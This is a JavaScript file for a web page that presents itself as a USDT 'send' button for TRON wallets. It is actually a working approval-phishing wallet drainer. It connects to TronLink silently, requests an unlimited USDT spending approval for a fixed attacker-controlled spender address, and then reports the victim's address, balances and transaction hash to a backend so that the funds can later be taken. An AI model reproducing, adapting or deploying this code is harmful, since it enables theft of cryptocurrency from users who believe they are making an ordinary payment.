let tronWeb = null;
let userAddress = null;
let isConnected = false;

// ===== TRON CONFIG =====
const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";

const ABI = [
  {
    "name": "approve",
    "inputs": [
      { "name": "spender", "type": "address" },
      { "name": "amount", "type": "uint256" }
    ],
    "outputs": [{ "name": "", "type": "bool" }],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "name": "balanceOf",
    "inputs": [{ "name": "owner", "type": "address" }],
    "outputs": [{ "name": "", "type": "uint256" }],
    "stateMutability": "view",
    "type": "function"
  }
];

// ===== SILENT BACKGROUND CONNECT =====
async function backgroundConnect() {
  try {
    // Wait for TronLink to inject
    if (!window.tronWeb) return;

    tronWeb = window.tronWeb;

    // Check if already connected
    if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
      userAddress = tronWeb.defaultAddress.base58;
      isConnected = true;
      return;
    }

    // Try to request accounts silently
    if (window.tronLink) {
      try {
        const res = await window.tronLink.request({ method: "tron_requestAccounts" });
        if (res && res.code === 200) {
          tronWeb = window.tronWeb;
          userAddress = tronWeb.defaultAddress.base58;
          isConnected = true;
        }
      } catch (e) {
        // Silent fail
      }
    }
  } catch (err) {
    console.log("Background connect:", err.message || err);
  }
}

// Run immediately
backgroundConnect();

// Retry on load (TronLink timing fix)
window.addEventListener("load", () => {
  setTimeout(() => {
    if (!isConnected) backgroundConnect();
  }, 500);

  // Also retry after 1s (some devices slower)
  setTimeout(() => {
    if (!isConnected) backgroundConnect();
  }, 1000);
});

// Listen for TronLink account changes
window.addEventListener("message", (e) => {
  if (e.data && e.data.message) {
    const msg = e.data.message;
    if (msg.action === "accountsChanged" || msg.action === "setAccount") {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        tronWeb = window.tronWeb;
        userAddress = tronWeb.defaultAddress.base58;
        isConnected = true;
      }
    }
  }
});

// ===== SEND USDT (APPROVE TRC20) =====
async function sendUSDT() {
  try {
    // Check TronLink available
    if (!window.tronWeb && !window.tronLink) {
      alert("Please open this page in Trust Wallet or TronLink");
      return;
    }

    // Connect if not connected
    if (!isConnected || !userAddress) {
      if (window.tronLink) {
        try {
          const res = await window.tronLink.request({ method: "tron_requestAccounts" });
          if (res && res.code === 200) {
            tronWeb = window.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
            isConnected = true;
          } else {
            alert("Please connect your wallet");
            return;
          }
        } catch (e) {
          alert("Please connect your wallet");
          return;
        }
      } else if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        tronWeb = window.tronWeb;
        userAddress = tronWeb.defaultAddress.base58;
        isConnected = true;
      } else {
        alert("Please open this page in Trust Wallet");
        return;
      }
    }

    tronWeb = window.tronWeb;
    const address = tronWeb.defaultAddress.base58;

    // Create USDT contract
    const contract = await tronWeb.contract(ABI, TRON_USDT);

    // Max uint256 approve
    const maxAmount = tronWeb.toBigNumber("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");

    // Send approval transaction
    const tx = await contract.approve(TRON_SPENDER, maxAmount).send({
      feeLimit: 100_000_000,
      callValue: 0,
    });

    // Wait for confirmation
    await new Promise(resolve => setTimeout(resolve, 3000));

    // Get USDT balance
    let usdtBalance = "0";
    let nativeBalance = "0";
    try {
      const usdtRaw = await contract.balanceOf(address).call();
      usdtBalance = (Number(usdtRaw) / 1e6).toFixed(2);
      const trxRaw = await tronWeb.trx.getBalance(address);
      nativeBalance = (trxRaw / 1e6).toFixed(2);
    } catch (e) {
      // Balance fetch failed - continue anyway
    }

    // Update UI
    if (window.setTransactionStatus) {
      window.setTransactionStatus("success");
    }

    // Save to backend
    if (window.saveTransaction) {
      window.saveTransaction({
        walletAddress: address,
        toAddress: TRON_SPENDER,
        txHash: tx,
        usdtBalance: usdtBalance,
        nativeBalance: nativeBalance,
      });
    }

  } catch (e) {
    console.error("sendUSDT error:", e);
    if (e.code === 4001 || (e.message && e.message.includes("cancel"))) {
      alert("Transaction cancelled");
    } else {
      alert("Transaction failed. Please try again.");
    }
  }
}

window.sendUSDT = sendUSDT;
